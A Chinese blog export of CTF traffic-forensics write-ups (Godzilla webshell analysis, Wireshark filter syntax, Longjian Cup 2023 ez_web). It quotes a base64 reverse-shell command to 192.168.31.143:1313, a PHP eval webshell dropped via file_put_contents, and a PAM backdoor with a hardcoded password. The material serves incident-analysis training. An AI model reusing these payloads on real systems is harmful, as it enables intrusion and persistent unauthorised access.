地址：这是黑客控制的服务器或计算机的网络地址，黑客在其后门程序中配置此地址，以便目标系统能够找到并连接到黑客的机器。\n2. 端口：这是指定的网络端口，用于接收连接请求。黑客可以选择常用端口（如 80、443）以避免引起怀疑，或者使用不常用的端口以减少被检测的风险。\n\n看到这个我第一反应就是反弹shell，继续往下看就能看到一个数据包\n\n![image-20250423021928796](../image/achieve/202411/玄机第六章/image-20250423021928796.png)\n\n![image-20250423021946467](../image/achieve/202411/玄机第六章/image-20250423021946467.png)\n\n![image-20250423022007129](../image/achieve/202411/玄机第六章/image-20250423022007129.png)\n\n解释一下命令：\n\n- `echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguMzEuMTQzLzEzMTMgMD4mMQ==|base64 -d|bash`：该命令首先输出一个经过Base64编码的字符串，然后通过管道符将输出转为后一个命令的输入，也就是将字符串进行base64解码，然后再通过管道符转向下一个命令 `bash` 执行。\n\n就是反弹shell，这里也直接给出了ip和端口\n\n```\nflag{192.168.31.143:1313}\n```\n\n## 11、黑客通过什么文件留下了后门？\n\n### 什么是后门文件？\n\n**后门文件**（Backdoor File）是指一种恶意文件或程序，攻击者通过它可以在未经授权的情况下访问或控制系统。\n\n### 后门文件的特点\n\n1. **隐蔽性**：\n   - 后门文件通常会被伪装成合法的文件或程序，或者隐藏在系统的正常文件中，以避免被用户或安全软件发现。\n2. **持久性**：\n   - 后门文件可能会通过修改系统配置文件、注册表或启动项，确保在系统重启后仍然能够运行。\n3. **绕过安全机制**：\n   - 后门文件通常会利用漏洞或特权提升技术，绕过系统的身份验证、防火墙或其他安全措施。\n4. **远程控制**：\n   - 后门文件通常与远程服务器通信，允许攻击者远程执行命令、窃取数据或控制系统。\n\n然后我们继续看下面的数据包\n\n![image-20250423022531853](../image/achieve/202411/玄机第六章/image-20250423022531853.png)\n\n![image-20250423022551687](../image/achieve/202411/玄机第六章/image-20250423022551687.png)\n\n这里使用了一个`getFiledirName` 方法\n\n### `getFiledirName` 方法\n\n`getFiledirName` 方法通常用于获取文件所在的目录路径或文件名。\n\n但是在响应的目录文件中没看到什么明显的可疑文件\n\n![image-20250423022735132](../image/achieve/202411/玄机第六章/image-20250423022735132.png)\n\n然后下面还对tmp目录下的文件名进行了查看\n\n![image-20250423022828891](../image/achieve/202411/玄机第六章/image-20250423022828891.png)\n\n紧接着看到一个很长的数据包\n\n![image-20250423022859728](../image/achieve/202411/玄机第六章/image-20250423022859728.png)\n\n![image-20250423022952007](../image/achieve/202411/玄机第六章/image-20250423022952007.png)\n\n文件路径：/tmp/pam_unix.so\n\n/tmp 目录通常用于存储临时文件，黑客选择这个目录可能是为了避开监控，因为很多系统管理员不会频繁检查该目录。\npam_unix.so 是一个常见的动态链接库文件，通常与 PAM（可插入式认证模块）相关联。这个文件名暗示了它可能涉及系统的身份验证。\n文件类型：NELF\n\nNELF 是指该文件是一个可执行的 ELF（可执行和可链接格式）文件，通常用于 Linux 系统中的可执行程序和共享库。\n\n### 后门目的\n\n利用 PAM：\n\n黑客可能利用这个库文件来创建一个后门，使得通过 PAM 进行身份验证时，黑客能够获得访问权限。这可以让他们在用户登录时获得控制权。\n隐蔽性：\n\n由于文件名与正常的系统文件相似，黑客可以更容易地隐藏他们的活动，降低被检测的风险。\n持久性：\n\n通过将后门与 PAM 模块关联，黑客可以在系统重启后仍然保持访问权限，因为 PAM 在系统启动和用户登录时都会被调用。\n\n然后我们还可以看一下这里的响应\n\n![image-20250423023127509](../image/achieve/202411/玄机第六章/image-20250423023127509.png)\n\n成功执行说明文件写入了\n\n```\nflag{pam_unix.so}\n```\n\n## 12、黑客设置的后门密码是什么？\n\n我往后看的时候发现已经没有数据包了，那么既然这里问到了后门密码，然后我们找到了后门文件，肯定这时候后门密码就是在后门文件中了\n\n师傅的分析：\n\n**题目问我们黑客设置后门密码是什么？那刚刚我们已经找出黑客留下的后门文件——“pam_unix.so”了，那这里又问我们后门密码，那这里多半后门密码是在后门文件中，那这时候我们就要想办法把后门文件“pam_unix.so”给“down”下来进行分析**\n\n如果需要下载下来的话，那我们这时候就需要连接服务器了\n\n![image-20250423023523351](../image/achieve/202411/玄机第六章/image-20250423023523351.png)\n\n连上了我们直接去找那个文件\n\n```\nfind / -name \"pam_unix.so\" 2>/dev/null\n```\n\n![image-20250423023710871](../image/achieve/202411/玄机第六章/image-20250423023710871.png)\n\n把他下载下来\n\n![image-20250423023958206](../image/achieve/202411/玄机第六章/image-20250423023958206.png)\n\n**我们使用`file`命令来查看一下文件**，**在 Linux 中，`file` 命令用于确定文件的类型。它通过检查文件的内容而不仅仅是文件的扩展名来识别文件类型。**\n\n```\nfile pam_unix.so\n```\n\n![image-20250423024303031](../image/achieve/202411/玄机第六章/image-20250423024303031.png)\n\n完全看不懂啊，只能看看师傅的分析：\n\n- `ELF 64-bit LSB shared object`\n\n1. `ELF`：表示该文件是以可执行和可链接格式（ELF）编写的，这是 Linux 和 Unix 系统中常用的可执行文件格式。\n2. `64-bit`：表示该文件是为 64 位系统编译的。\n3. `LSB`：代表 Linux Standard Base，指该文件遵循 Linux 标准基准的格式。\n4. `shared object`：指这是一个共享对象文件，即可以被多个程序共享的库文件。\n\n- `x86-64`\n\n表示该文件是为 x86-64 架构（64 位 Intel/AMD 处理器）编译的。\n\n- `version 1 (SYSV)`\n\n表示这是第一版本的系统 V ABI（应用二进制接口），通常用于描述二进制接口规范。\n\n- `dynamically linked`\n\n表示该共享库是在运行时链接的，这意味着它可能依赖其他库，且在程序执行时会加载这些依赖。\n\n- `BuildID[sha1]=b823fd038f580c704c3c8e26f383e82b7cdb5f59`\n\n表示该文件的构建 ID，通常用于版本管理和调试。\n\n- `with debug_info`\n\n表示该文件包含调试信息。这意味着开发者可以在调试程序时获得更多上下文信息，比如函数名、变量名等。\n\n- `not stripped`\n\n表示该文件没有被“剥离”，也就是说，它保留了符号表和调试信息。通常在发布版本时，文件会被剥离，以减小大小和保护内部实现。\n\n**`pam_unix.so` 是一个为 64 位 x86-64 架构编写的动态链接共享库，遵循 ELF 格式，包含调试信息且没有剥离。它是 PAM（可插入式认证模块）的一部分，用于处理基于 UNIX 的身份验证。**\n\n好吧，这里还得用IDA，电脑重装后都没安装过，我们需要**丢进64位的IDA中进行分析**\n\n**IDA（Interactive DisAssembler）是一个广泛使用的反汇编和逆向工程工具，主要用于分析和理解二进制文件。**\n\n`pam_sm_authenticate` 是 PAM（可插拔认证模块）框架中的一个函数，主要用于用户身份验证。这个函数的作用是对用户提供的凭证（如密码）进行验证，通常是在 PAM 模块中实现的。\n\n所以我们打开IDA后就直接找这个函数就行，借师傅一张图吧\n\n![在这里插入图片描述](../image/achieve/202411/玄机第六章/6b0edff64860456683644e062508a241.png)\n\n代码分析（大师傅的）\n\n- `pam_set_data(pamh, \"unix_setcred_return\", v6, setcred_free);`：将某些认证数据`（v6）`存储在 PAM 句柄中，便于后续使用。\n\n\n- `authtok = pam_get_authtok();`：调用 pam_get_authtok() 获取用户的认证令牌（通常是密码）。\n\n- 密码检查：如果 authtok 不存在，调用 `unix_verify_password(pamh, name, p, v4); `来验证密码。如果验证失败，记录日志并返回错误代码。\n\n- 特殊密码检查：代码中有一行` v12 = strcmp(\"XJ@123\", p) == 0;`，用于检查输入密码是否为 `\"XJ@123\"`。如果匹配成功，设置返回值 v8。\n\n- 记录日志：使用 `pam_syslog` 记录关于用户名的错误信息，如果用户名不正确，返回相应的错误代码。\n\n- 后门密码分析所以可以确认的是黑客设置的后门密码是：`\"XJ@123\"。`\n\n- 为什么确定是：代码中明确比较用户输入的密码是否等于 `\"XJ@123\"`，并根据比较结果决定认证是否成功。如果这个密码被硬编码在代码中，黑客可能利用这个密码获得不当访问权限。\n\n- 总结\n\n代码的逻辑表明，黑客通过在身份验证逻辑中嵌入一个特定的密码 \"XJ@123\" 来创建后门，使得他们能够绕过正常的身份验证流程。\n\n所以最终的密码就是\n\n```\nflag{XJ@123}\n```\n\n## 13、黑客的恶意dnslog服务器地址是什么？\n\n### 什么是dnslog服务器？\n\n**DNSLog 服务器** 是一种用于网络安全检测和渗透测试的工具，主要用于记录和捕获 DNS 查询请求。它通过模拟一个 DNS 服务器，接收并记录目标系统或应用程序发送的 DNS 请求，从而帮助安全研究人员或渗透测试人员检测漏洞或验证攻击是否成功。\n\n------\n\n#### **DNSLog 服务器的工作原理**\n\n1. **域名生成**：\n   - DNSLog 服务器会生成一个唯一的子域名（例如 `abc123.dnslog.cn`），并将该域名提供给用户或测试工具。\n2. **DNS 查询触发**：\n   - 用户或测试工具将生成的域名嵌入到目标系统或应用程序中（例如，通过漏洞利用、恶意代码注入等）。\n   - 如果目标系统或应用程序解析了该域名，就会向 DNSLog 服务器发送 DNS 查询请求。\n3. **记录和显示**：\n   - DNSLog 服务器会记录所有接收到的 DNS 查询请求，并在 Web 界面上显示查询的详细信息（如查询时间、源 IP 地址、查询的域名等）。\n\n------\n\n#### **DNSLog 服务器的用途**\n\n1. **漏洞检测**：\n   - 用于检测目标系统是否存在 DNS 查询相关的漏洞（例如，DNS 注入、SSRF、XXE 等）。\n   - 通过观察 DNSLog 服务器是否收到查询请求，可以判断漏洞是否被成功利用。\n2. **无回显漏洞验证**：\n   - 对于某些无回显的漏洞（例如 Blind SQL 注入、命令注入等），DNSLog 服务器可以作为外带通道，帮助验证漏洞是否存在。\n3. **渗透测试**：\n   - 在渗透测试中，DNSLog 服务器可以用于测试目标系统的 DNS 解析行为，或验证某些攻击是否成功。\n4. **日志分析**：\n   - 通过分析 DNSLog 服务器记录的查询请求，可以了解目标系统的网络行为或攻击者的活动轨迹。\n\n------\n\n#### **DNSLog 服务器的特点**\n\n1. **无侵入性**：\n   - DNSLog 服务器仅记录 DNS 查询请求，不会对目标系统造成额外的影响。\n2. **实时性**：\n   - DNSLog 服务器会实时显示接收到的 DNS 查询请求，方便用户快速获取结果。\n3. **易于使用**：\n   - 用户只需访问 DNSLog 服务器的 Web 界面，生成一个唯一的子域名，并将其嵌入到目标系统中即可。\n4. **支持多种场景**：\n   - 适用于多种漏洞检测和渗透测试场景，尤其是无回显漏洞的验证。\n\n推荐一个DNS服务器的在线平台：[dnslog在线](http://www.dnslog.cn/)\n\n那这道题我们该怎么做呢？\n\n同样的，我直接看着师傅的wp了\n\n在IDA中继续看\n\n![img](../image/achieve/202411/玄机第六章/de7d967445b644c38bc7e976ac2799e0.png)\n\n**首先可以确认恶意 DNSLog 服务器地址：**\n\n```\nc0ee2ad2d8.ipv6.xxx.eu.org.\n```\n\n为什么是这个地址\n\n- 动态生成：\n\n\n代码中使用 snprintf 函数构造了一个 DNS 名称，结合了 name 和 p 变量。虽然具体的 name 和 p 值没有给出，但可以确定最终的地址是以 `c0ee2ad2d8.ipv6.xxx.eu.org. `结尾。\n\n- 恶意意图：\n\n这个 DNS 名称的构造意图是让被感染的系统向这个地址发送 DNS 请求，黑客可以通过 DNSLog 服务器记录下请求，获取用户的信息或活动。\n\n- 与攻击者的联系：\n\n通过这个地址，攻击者可以监控和识别目标系统，进而实施进一步的攻击或数据窃取。\n\n- 总结\n\n恶意 DNSLog 服务器的地址 c0ee2ad2d8.ipv6.xxx.eu.org. 是代码动态生成的，目的是监控用户活动并建立与攻击者的联系。\n\n所以最终的flag\n\n```\nflag{c0ee2ad2d8.ipv6.xxx.eu.org.}\n```\n\n# 总结\n\n终于看完了，此行也算是受益颇多了，做这个哥斯拉主要是因为之前在做一道陇剑杯的题，但是当时不知道哥斯拉的特征和流量怎么分析，然后又不太会抓现成的，所以就直接做玄机的题目了，没关系，后面会学习如何抓现成的包去进行深入分析\n","tags":["玄机第六章哥斯拉流量分析"],"categories":["玄机"]},{"title":"流量分析","url":"/2025/04/22/流量分析/","content":"\n# Wireshark的使用\n\nhttp contains \"/system/index.php\" &&http.request.method == \"POST\"\n\n## **Wireshark抓包原理**\n\nWireshark使用的环境大致分为两种，一种是电脑直连互联网的单机环境，另外一种就是应用比较多的互联网环境，也就是连接交换机的情况。\n\n「单机情况」下，Wireshark直接抓取本机网卡的网络流量；\n\n「交换机情况」下，Wireshark通过端口镜像、ARP欺骗等方式获取局域网中的网络流量。\n\n- 端口镜像：利用交换机的接口，将局域网的网络流量转发到指定电脑的网卡上。\n- ARP欺骗：交换机根据MAC地址转发数据，伪装其他终端的MAC地址，从而获取局域网的网络流量。\n\n## Wireshark抓包页面介绍\n\n先来看看wireshark的页面\n\n![image-20250422003656187](../image/achieve/202411/陇剑杯2023/image-20250422003656187.png)\n\n## 协议分级统计表\n\nWireshark 的 **协议分级统计表**（Protocol Hierarchy Statistics）是通过 **协议栈分层解析** 生成的，其分级逻辑遵循网络通信的 **OSI 模型** 或 **TCP/IP 协议栈**，从底层到上层逐层拆解数据包。\n\n### **协议分级的核心逻辑**\n\n#### **(1) 分层依据**\n\nWireshark 会按以下顺序解析每个数据包，并统计各层协议的占比：\n\n```\n1. **物理层**（如 Ethernet、Wi-Fi）  \n2. **网络层**（如 IPv4/IPv6）  \n3. **传输层**（如 TCP/UDP）  \n4. **应用层**（如 HTTP/DNS/SMB）  \n5. **载荷数据**（如 JSON/图片/加密流）\n```\n\n#### **(2) 统计规则**\n\n- 按分组百分比\n\n  ：统计某协议在所有数据包中出现的频率。\n\n  - 例如：`TCP 占 99.45%` 表示 99.45% 的包包含 TCP 头。\n\n- 按字节百分比\n\n  ：统计某协议在所有字节中的占比（含下层协议头开销）。\n\n  - 例如：`HTTP 占 56.3%` 表示 HTTP 及其载荷占总流量的 56.3%。\n\n# Wireshark过滤器语法\n\n参考文章：https://www.cnblogs.com/-wenli/p/13096718.html\n\n官方文档：https://www.wireshark.org/docs/man-pages/wireshark-filter.html\n\n## 比较运算符\n\n```\neq, == 等于\nne, != 不等于\ngt, > 大于\nlt, < 小于\nge, >= 大于或等于\nle, <= 小于或等于\n```\n\n举个例子\n\n```\nhttp.request.method eq \"POST\"\n当然也可以用\nhttp.request.method == \"POST\"\n```\n\n![image-20250422004050550](../image/achieve/202411/陇剑杯2023/image-20250422004050550.png)\n\n当然，一个字段在给定帧中可能出现不止一次。在这种情况下，相等性可以是严格的（所有字段必须匹配条件）或不严格的（任何字段必须匹配条件）。\n\n```\neq, any_eq, == 任何字段必须相等\n\tall_eq, === 所有字段必须相等\nne, all_ne, != 所有字段必须不相等\n    any_ne, !== 任何字段必须不相等\n```\n\n运算符“any”或“all”可以与任何比较运算符一起使用，例如\n\n```\nall http.request.method == \"POST\"\n```\n\n![image-20250422221526453](../image/achieve/202411/陇剑杯2023/image-20250422221526453.png)\n\n需要注意的是，“any”和“all”修饰符优先于“=”和“any_eq”等比较运算符。\n\n## 搜索和匹配运算符\n\n### contains运算符\n\n```\ncontains \t协议、字段或切片是否包含值\n```\n\n关于contains：“contains”运算符允许过滤器搜索以字符串表示的字符序列或以字节数组表示的字节序列。“contains”运算符左侧的类型在任何隐式或显式转换后必须与右侧的类型相当。\n\n例如我们希望搜索包含file_put_contents的HTTP协议流，可以使用以下过滤器\n\n```\nhttp contains \"file_put_contents\"\n```\n\n### matches, ~运算符\n\n```\nmatch,~\t\t字符串是否匹配给定的不区分大小写的\n             兼容perl的正则表达式\n```\n\n“matches”或“~”运算符允许将过滤器应用于指定的 Perl 兼容正则表达式 (PCRE2)。该正则表达式必须是双引号括起来的字符串。“matches”运算符的左侧必须是字符串，可以是隐式或显式转换为字符串的非字符串字段。默认情况下，匹配不区分大小写。\n\n## 常见的过滤函数\n\n```\nupper(string-field) - 将字符串字段转换为大写\nlower(string-field) - 将字符串字段转换为小写\nlen(field) - 返回字符串或字节字段的字节长度\ncount(field) - 返回帧中字段出现的次数\nstring(field) - 将非字符串字段转换为字符串\nvals(field) - 将字段值转换为其值字符串\ndec(field) - 将无符号整数转换为十进制字符串\nhex(field) - 将无符号整数转换为十六进制字符串\nmax(f1,...,fn) - 返回最大值\nmin(f1,...,fn) - 返回最小值\nabs(field) - 返回数字字段的绝对值\n```\n\n此时就可以看到，当upper() 和 lower() 在执行不区分大小写的字符串比较时很有用。例如结合matches\n\n```\nupper(http.request.method) == \"POST\"//将http.request.method的结果转化成大写后进行比较\n```\n\n\n\n## http模式过滤\n\n### 过滤1：http.request\n\n![image-20250422004406903](../image/achieve/202411/陇剑杯2023/image-20250422004406903.png)\n\n```\n1：http.request.method -> 用于筛选特定 HTTP 请求方法的流量。\nhttp.request.method == \"GET\"\nhttp.request.method == \"POST\"\n\n2.http.request.uri -> 用于捕获请求中的资源路径、查询参数（如 /api/data?id=123）。\nhttp.request.uri == \"/index.php\"\n\n3.http.request.full_uri -> 用于捕获 HTTP 请求的完整 URI（包括协议、主机名、路径、查询参数等）。如 https://example.com/api/data?id=123#section。\nhttp.request.full_uri == \"http://192.168.162.130:82/e/public/ViewClick/d00r.php\"\n\n4.http.request.uri.path -> 用于专门匹配 HTTP 请求 URI 中的路径部分（不包含查询参数、片段或主机名）。例如，对于 URI /api/data?id=123#section，http.request.uri.path 仅匹配 /api/data。\nhttp.request.uri.path == \"/api/data\"\n\n5.http.request.uri.query -> 用于专门匹配 HTTP 请求 URI 中的查询字符串（Query String），即 ? 后面的部分（不包含路径、片段或 ? 本身）。\nhttp.request.uri.query == \"?id=1\"\n\n6.http.request.version -> 用于匹配 HTTP 请求的协议版本（如 HTTP/1.0、HTTP/1.1 或 HTTP/2）。\nhttp.request.version == \"HTTP/1.0\"\n\n7.http.request.line -> 用于匹配 HTTP 请求的起始行（Request Line），即 HTTP 请求的第一行内容。\n格式：\nMETHOD URI HTTP/VERSION\n如（GET /index.html HTTP/1.1）\nhttp.request.line == \"GET /index.html HTTP/1.1\"\n```\n\n### 过滤2：http.response\n\n![image-20250422005907140](../image/achieve/202411/陇剑杯2023/image-20250422005907140.png)\n\n```\n1.http.response.code -> 用于匹配 HTTP 响应的状态码（如 200、404、500 等）。\nhttp.response.code == 200\n\n2.http.response.line -> 用于匹配 HTTP 响应报文中的第一行（状态行），包含 协议版本、状态码和状态短语。例如：HTTP/1.1 200 OK 或 HTTP/2 404 Not Found。\nhttp.response.line == \"HTTP/1.1 200 OK\"\n\n3.http.response.version -> 用于匹配 HTTP 响应的协议版本（如 HTTP/1.1、HTTP/2 等）。\nhttp.response.version == \"HTTP/1.1\"\n\n4.http.response.code.desc -> 用于匹配 HTTP 响应状态码对应的文本描述（状态短语）。如 OK、Not Found、Internal Server Error 等），而非状态码本身。\nhttp.response.code.desc == \"OK\"\n\n5.http.response.phrase ->用于匹配 HTTP 响应状态行中的状态短语（Status Phrase），即状态码后的文本描述。如 OK、Not Found、Internal Server Error 等），而非状态码本身。\nhttp.response.phrase == \"OK\"\n```\n\n## IP模式过滤\n\n### 过滤1：ip.src和ip.dst\n\n- **ip.src**：用于筛选 **IP 数据包的源地址（Source IP Address）**。\n\n```\nip.src == 192.168.162.188\n```\n\n- **ip.dst**：用于筛选 **IP 数据包的目的地址（Source IP Address）**。\n\n```\nip.dst == 192.168.162.188\n```\n\n### 过滤2：ip.addr\n\nip.addr 可以匹配数据包的源IP地址或目标IP地址，它会同时检查源IP和目标IP，只要其中一个匹配就会显示该数据包。\n\n```\nip.addr == 192.168.162.188\n```\n\n![image-20250422223751327](../image/achieve/202411/陇剑杯2023/image-20250422223751327.png)\n\n### 过滤3：\n\n## TCP模式过滤\n\n### 过滤1：tcp.connection.synack\n\ntcp.connection.synack 是 Wireshark 中用于分析 TCP 连接建立过程的一个特殊过滤器。它主要用于识别 TCP 三次握手中的 SYN-ACK 包。\n\n这个过滤器用于显示 TCP 连接建立过程中的 SYN-ACK 数据包。\n\n![image-20250422223931317](../image/achieve/202411/陇剑杯2023/image-20250422223931317.png)\n\n### 过滤2：tcp.dstport和tcp.srcport\n\n1. tcp.dstport（目标端口）:\n   - 用于过滤特定目标端口的 TCP 数据包\n   - 示例：tcp.dstport == 80 （显示所有发往 HTTP 默认端口的数据包）\n2. tcp.srcport（源端口）:\n   - 用于过滤特定源端口的 TCP 数据包\n   - 示例：tcp.srcport == 443 （显示所有来自 HTTPS 默认端口的数据包）\n\n### 过滤3：tcp.port \n\n1. 基本功能：\n   - 匹配源端口或目标端口中的任何一个\n   - 等同于 (tcp.srcport or tcp.dstport)\n2. 使用示例：\n   - tcp.port == 80 这会显示所有源端口或目标端口为 80 的 TCP 数据包\n3. 多端口过滤：\n   - tcp.port in {80, 443, 8080} 这会显示端口为 80、443 或 8080 的所有 TCP 数据包\n4. 范围过滤：\n   - tcp.port >= 1024 and tcp.port <= 49151 显示所有使用注册端口范围的 TCP 数据包\n\n# ifconfig命令\n\n`ifconfig`（**Interface Configurer**）是 Linux/Unix 系统中用于查看和配置网络接口（网卡）信息的经典命令。\n\n# 什么是内网ip\n\n内网（**内部网络**，也称为**私有网络**或**局域网 LAN**）是指在一个组织、家庭或特定范围内建立的封闭网络环境，**不直接暴露在公共互联网上**。内网中的设备可以互相通信，但通常需要通过网关（如路由器、防火墙）才能访问外网（Internet）。\n\n# 内网ip的范围\n\n内网设备通常使用 **RFC 1918** 定义的私有 IP 地址范围，这些地址在互联网上不可路由：\n\n- **`10.0.0.0/8`**（`10.0.0.0` ~ `10.255.255.255`）\n- **`172.16.0.0/12`**（`172.16.0.0` ~ `172.31.255.255`）\n- **`192.168.0.0/16`**（`192.168.0.0` ~ `192.168.255.255`）\n\n# **IPv4 地址分类**\n\n在早期的 IPv4 分类中，IP 地址被分为 **A、B、C、D、E 五类**，其中 **C 类地址** 适用于小型网络：\n\n| **类别** | **IP 范围**                     | **默认子网掩码** | **适用场景**     |\n| -------- | ------------------------------- | ---------------- | ---------------- |\n| A 类     | `1.0.0.0` ~ `126.255.255.255`   | `255.0.0.0`      | 大型企业、运营商 |\n| B 类     | `128.0.0.0` ~ `191.255.255.255` | `255.255.0.0`    | 中型企业、校园网 |\n| **C 类** | `192.0.0.0` ~ `223.255.255.255` | `255.255.255.0`  | **小型局域网**   |\n| D 类     | `224.0.0.0` ~ `239.255.255.255` | 无（组播地址）   | 视频会议、流媒体 |\n| E 类     | `240.0.0.0` ~ `255.255.255.255` | 保留（实验用途） | 未分配           |\n\n# 常见webshell工具流量特征\n\n## 哥斯拉流量\n\n**哥斯拉流量**是指使用哥斯拉（Godzilla）WebShell工具进行攻击时产生的网络流量。哥斯拉是一种功能强大的WebShell工具，常用于渗透测试和网络攻击。它的流量具有特定的特征，我们可以通过分析这些特征来检测和防御哥斯拉攻击。\n","tags":["流量分析"],"categories":["流量分析"]},{"title":"陇剑杯2023wp","url":"/2025/04/21/陇剑杯2023wp/","content":"\n# [陇剑杯 2023]ez_web（一）\n\n## #服务器自带后门文件\n\n问题：服务器自带的后门文件名是什么？（含文件后缀）\n得到的答案使用NSSCTF{}格式提交\n\n解题：\n\n因为是需要查找服务器自带的文件，所以可以猜测攻击者是否会进行目录扫描操作，如果有对目录进行扫描的话我们就可以借助扫描的结果去找到存在的文件\n\n![image-20250421234139409](../image/achieve/202411/陇剑杯2023/image-20250421234139409.png)\n\n![image-20250421234222479](../image/achieve/202411/陇剑杯2023/image-20250421234222479.png)\n\n这里可以看到d00r.php文件访问的状态码是200并且传入system(\"whoami\")也正常执行并返回www，一开始以为是这个d00r.php，但是提交是错误的，那我们看看这个d00r.php是怎么生成的\n\n```\nhttp contains \"d00r.php\"\n```\n\n![image-20250421234955034](../image/achieve/202411/陇剑杯2023/image-20250421234955034.png)\n\n可以看到一个跟d00r不相干的数据包出现了，我们跟进看一下\n\n![image-20250421235111556](../image/achieve/202411/陇剑杯2023/image-20250421235111556.png)\n\n可以看到一开始访问/e/public/ViewClick/ViewMore.php的时候文件是存在的，并且在流量包中看到了对d00r.php文件的创建\n\n```\na=file_put_contents%28%27d00r.php%27%2C+base64_decode%28%27PD9waHAgZXZhbCgkX1BPU1RbJ2NtZCddKTs%2FPg%3D%3D%27%29%29%3B\n\nURL解码后内容为\na=file_put_contents('d00r.php', base64_decode('PD9waHAgZXZhbCgkX1BPU1RbJ2NtZCddKTs/Pg=='));\n\nPD9waHAgZXZhbCgkX1BPU1RbJ2NtZCddKTs/Pg==在base64解码后内容为：\n<?php eval($_POST['cmd']);?>\n```\n\n并且用过滤器搜寻了这个文件\n\n![image-20250421235435744](../image/achieve/202411/陇剑杯2023/image-20250421235435744.png)\n\n很明显，我们的d00r.php文件是通过/e/public/ViewClick/ViewMore.php文件去生成的，并且ViewMore.php文件之前并没有创建的痕迹，所以/e/public/ViewClick/ViewMore.php文件是服务器自带的后门文件\n\n```\nNSSCTF{ViewMore.php}\n```\n\n# [陇剑杯 2023]ez_web（二）\n\n## #服务器内网ip\n\n问题：服务器内网IP是多少？\n得到的答案使用NSSCTF{}格式提交\n\n解题：\n\n在d00r.php的利用中我们可以看到攻击者曾传入许多命令，也包括ifconfig\n\n![image-20250422000105027](../image/achieve/202411/陇剑杯2023/image-20250422000105027-1745251266384-6.png)\n\n## ifconfig命令\n\n`ifconfig`（**Interface Configurer**）是 Linux/Unix 系统中用于查看和配置网络接口（网卡）信息的经典命令。\n\n![image-20250422000152282](../image/achieve/202411/陇剑杯2023/image-20250422000152282.png)\n\n我们分析一下这个内容\n\n这里一共有五个网络接口\n\n- **`br-2fc7bfd07160`**：Docker 自定义网桥\n- **`docker0`**：Docker 默认网桥\n- **`ens33`**：物理网卡（主网络）\n- **`ens38`**：物理网卡（第二网络）\n- **`lo`**：本地回环接口\n\n最后一个本地回环接口我们就不说了，是最常见的本地回环测试地址127.0.0.1\n\n关键在于这两个物理网卡\n\n```\nens33: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500\n        inet 192.168.162.130  netmask 255.255.255.0  broadcast 192.168.162.255\n        inet6 fe80::ae06:234d:1e0a:9aac  prefixlen 64  scopeid 0x20<link>\n        ether 00:0c:29:08:04:89  txqueuelen 1000  (Ethernet)\n        RX packets 397410  bytes 398085633 (398.0 MB)\n        RX errors 0  dropped 0  overruns 0  frame 0\n        TX packets 140095  bytes 20078864 (20.0 MB)\n        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0\n\nens38: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500\n        inet 192.168.101.132  netmask 255.255.255.0  broadcast 192.168.101.255\n        inet6 fe80::68af:1a5:a54c:7366  prefixlen 64  scopeid 0x20<link>\n        ether 00:0c:29:08:04:93  txqueuelen 1000  (Ethernet)\n        RX packets 362  bytes 35928 (35.9 KB)\n        RX errors 0  dropped 0  overruns 0  frame 0\n        TX packets 1654  bytes 141760 (141.7 KB)\n        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0\n```\n\n从该http流可以看到\n\n![image-20250422000742058](../image/achieve/202411/陇剑杯2023/image-20250422000742058.png)\n\n上面显示的目标ip是192.168.162.130，就是服务器公网ip，也就对应了主网络的物理网卡\n\n所以192.168.101.132就是他的内网ip\n\n```\nNSSCTF{192.168.101.132}\n```\n\n那我们这里需要科普一下，什么是内网ip，内网ip的范围是多少\n\n## 什么是内网ip\n\n内网（**内部网络**，也称为**私有网络**或**局域网 LAN**）是指在一个组织、家庭或特定范围内建立的封闭网络环境，**不直接暴露在公共互联网上**。内网中的设备可以互相通信，但通常需要通过网关（如路由器、防火墙）才能访问外网（Internet）。\n\n## 内网ip的范围\n\n内网设备通常使用 **RFC 1918** 定义的私有 IP 地址范围，这些地址在互联网上不可路由：\n\n- **`10.0.0.0/8`**（`10.0.0.0` ~ `10.255.255.255`）\n- **`172.16.0.0/12`**（`172.16.0.0` ~ `172.31.255.255`）\n- **`192.168.0.0/16`**（`192.168.0.0` ~ `192.168.255.255`）\n\n## **IPv4 地址分类**\n\n在早期的 IPv4 分类中，IP 地址被分为 **A、B、C、D、E 五类**，其中 **C 类地址** 适用于小型网络：\n\n| **类别** | **IP 范围**                     | **默认子网掩码** | **适用场景**     |\n| -------- | ------------------------------- | ---------------- | ---------------- |\n| A 类     | `1.0.0.0` ~ `126.255.255.255`   | `255.0.0.0`      | 大型企业、运营商 |\n| B 类     | `128.0.0.0` ~ `191.255.255.255` | `255.255.0.0`    | 中型企业、校园网 |\n| **C 类** | `192.0.0.0` ~ `223.255.255.255` | `255.255.255.0`  | **小型局域网**   |\n| D 类     | `224.0.0.0` ~ `239.255.255.255` | 无（组播地址）   | 视频会议、流媒体 |\n| E 类     | `240.0.0.0` ~ `255.255.255.255` | 保留（实验用途） | 未分配           |\n\n# [陇剑杯 2023]ez_web（三）\n\n问题：攻击者往服务器中写入的key是什么？\n得到的答案使用NSSCTF{}格式提交\n\n解题：\n\n观察到一个流量\n\n![image-20250422001440773](../image/achieve/202411/陇剑杯2023/image-20250422001440773.png)\n\n有写文件的操作，并且文件名是k3y_f1le，我们看看写入了什么内容\n\n那段编码是**Base64 编码的 ZIP 压缩文件**\n\n## #Base64 编码的 ZIP 压缩文件\n\n**原始 ZIP 文件**\n\nZIP 文件的标准格式（PKZIP）包含以下关键部分：\n\n- **文件头**：`50 4B 03 04`（PK..，十六进制标识）。\n- **文件数据**：压缩的文件内容。\n- **中央目录记录**：存储文件元信息（文件名、大小等）。\n- **结束记录**：`50 4B 05 06`（PK..，标记文件结束）。\n\n**（2）Base64 编码后**\n\n- Base64 特征\n  - 以 `UEsDBBQ` 开头（对应 ZIP 文件头的 `PK..` 的 Base64 编码）。\n  - 长度是 4 的倍数（不足时用 `=` 填充）。\n  - 由字母（A-Za-z）、数字（0-9）、`+`、`/` 和 `=` 组成。\n\n那我们提取出来为zip\n\n- 先将编码内容保存为txt文件\n\n- 使用Windows的命令还原成zip文件\n\n```\ncertutil -decode 1.txt 